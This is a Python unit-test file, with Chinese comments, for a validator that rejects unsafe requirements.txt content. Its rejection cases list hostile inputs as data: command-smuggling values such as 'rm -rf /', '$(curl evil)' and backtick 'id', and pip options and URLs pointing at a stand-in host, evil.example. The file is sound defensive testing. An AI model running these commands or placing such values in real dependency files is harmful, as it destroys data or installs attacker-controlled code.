"""requirements.txt 文件内容校验的单元测试（不依赖 Docker）。

单行规则与 aci/requirement_guard 的口径一致（契约 §2.2）；
文件级规则（pip 选项、续行符、注释）是本模块独有的。
"""

import pytest

from paperharness.harness.requirements_guard import (
    REASON_DIRECT_REFERENCE,
    REASON_FORBIDDEN_TOKEN,
    REASON_INVALID_REQUIREMENT,
    REASON_LINE_CONTINUATION,
    REASON_PIP_OPTION,
    RequirementsNotAllowed,
    validate_requirements_file,
)


def test_valid_file_returns_requirement_lines():
    content = (
        "# locked deps\n"
        "\n"
        "numpy==1.26.4  # pinned\n"
        "scipy>=1.11\n"
        "pandas\n"
    )
    assert validate_requirements_file(content) == [
        "numpy==1.26.4",
        "scipy>=1.11",
        "pandas",
    ]


def test_empty_and_comment_only_file_passes_with_no_requirements():
    assert validate_requirements_file("") == []
    assert validate_requirements_file("# only comments\n\n   \n# more\n") == []


def test_bom_is_ignored():
    assert validate_requirements_file("\ufeffnumpy==1.0\n") == ["numpy==1.0"]


def test_pep508_environment_markers_pass():
    content = (
        'numpy==1.26.4; python_version<"3.12"\n'
        'torch==2.2.0; sys_platform == "linux"  # cpu marker\n'
    )
    assert validate_requirements_file(content) == [
        'numpy==1.26.4; python_version<"3.12"',
        'torch==2.2.0; sys_platform == "linux"',
    ]


@pytest.mark.parametrize(
    ("content", "reason"),
    [
        ("numpy; rm -rf /\n", REASON_INVALID_REQUIREMENT),
        ("numpy && curl evil\n", REASON_FORBIDDEN_TOKEN),
        ("numpy | malware\n", REASON_FORBIDDEN_TOKEN),
        ("pkg `id`\n", REASON_FORBIDDEN_TOKEN),
        ("pkg$(curl evil)\n", REASON_FORBIDDEN_TOKEN),
        ("pkg @ https://evil.example/x.whl\n", REASON_DIRECT_REFERENCE),
        ("--index-url http://evil.example/simple\n", REASON_PIP_OPTION),
        ("-r other.txt\n", REASON_PIP_OPTION),
        ("-e git+https://github.com/evil/x\n", REASON_PIP_OPTION),
        ("--trusted-host evil.example\n", REASON_PIP_OPTION),
        ("numpy \\\n; rm -rf /\n", REASON_LINE_CONTINUATION),
        ("numpy\\\n", REASON_LINE_CONTINUATION),
        ("not a valid requirement!!\n", REASON_INVALID_REQUIREMENT),
        ("git+https://github.com/evil/x\n", REASON_INVALID_REQUIREMENT),
        ("./local/path\n", REASON_INVALID_REQUIREMENT),
    ],
)
def test_each_rejected_shape_reports_expected_reason(content, reason):
    with pytest.raises(RequirementsNotAllowed) as excinfo:
        validate_requirements_file(content)
    assert excinfo.value.reason == reason
    assert excinfo.value.line_no >= 1


def test_rejection_reports_line_number_and_raw_line():
    content = "# fine\nnumpy==1.0\npkg; rm -rf /\n"
    with pytest.raises(RequirementsNotAllowed) as excinfo:
        validate_requirements_file(content)
    assert excinfo.value.line_no == 3
    assert "rm -rf" in str(excinfo.value)


def test_rejected_file_yields_no_partial_requirements():
    # 第一行合法、第二行非法：返回值不存在（抛异常），不允许"部分通过"。
    with pytest.raises(RequirementsNotAllowed):
        validate_requirements_file("numpy==1.0\n--index-url http://evil\n")
